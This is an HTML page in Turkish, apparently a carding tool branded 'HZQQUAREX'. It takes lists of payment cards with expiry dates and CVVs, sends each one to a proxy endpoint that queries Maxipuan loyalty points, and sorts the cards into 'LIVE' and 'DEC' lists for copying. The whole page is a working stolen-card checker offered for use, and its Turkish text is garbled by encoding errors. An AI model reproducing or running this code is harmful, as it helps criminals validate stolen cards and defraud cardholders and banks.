<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>HZQQUAREX - Maxipuan Sorgulama</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #111; color: white; }
    textarea { width: 100%; height: 150px; margin-bottom: 10px; }
    button { padding: 10px 20px; background: #4CAF50; color: white; border: none; cursor: pointer; }
    #sonuclar { margin-top: 20px; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>HZQQUAREX üí≥ Maxipuan Sorgulama</h1>
  <textarea id="cards" placeholder="Kartlarƒ± cc|ay|yƒ±l|cvv ≈üeklinde girin."></textarea><br>
  <button onclick="kontrolEt()">Kontrol Et</button>
  <button onclick="kopyala('LIVE')">‚úÖ LIVE Kopyala</button>
  <button onclick="kopyala('DEC')">‚ùå DEC Kopyala</button>
  
  <div id="sonuclar"></div>

  <script>
    async function kontrolEt() {
      const lines = document.getElementById('cards').value.trim().split('\n');
      const sonuclar = { LIVE: [], DEC: [] };
      document.getElementById('sonuclar').innerText = 'Kontrol ediliyor...';

      for (const line of lines) {
        const [cc, month, year, cvv] = line.split('|');
        try {
          const res = await fetch(`/proxy?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=45542`);
          const text = await res.text();
          const sonuc = `${line} ‚ûú ${text} @HzQuarex`;
          if (text.includes("Maxipuan") || text.includes("puan")) {
            sonuclar.LIVE.push(sonuc);
          } else {
            sonuclar.DEC.push(sonuc);
          }
        } catch {
          sonuclar.DEC.push(`${line} ‚ûú ‚ùå HATA @HzQuarex`);
        }
      }

      document.getElementById('sonuclar').innerText =
        "‚úÖ LIVE:\n" + sonuclar.LIVE.join('\n') + "\n\n‚ùå DEC:\n" + sonuclar.DEC.join('\n');
    }

    function kopyala(tur) {
      const text = document.getElementById('sonuclar').innerText;
      const pattern = new RegExp(`${tur === 'LIVE' ? "‚úÖ LIVE:[\\s\\S]*?(?=\\n\\n|$)" : "‚ùå DEC:[\\s\\S]*"}`);
      const match = text.match(pattern);
      if (match) {
        navigator.clipboard.writeText(match[0].replace(/^‚úÖ LIVE:\n|^‚ùå DEC:\n/, ''));
        alert(`${tur} sonu√ßlar kopyalandƒ±!`);
      }
    }
  </script>
</body>
</html>
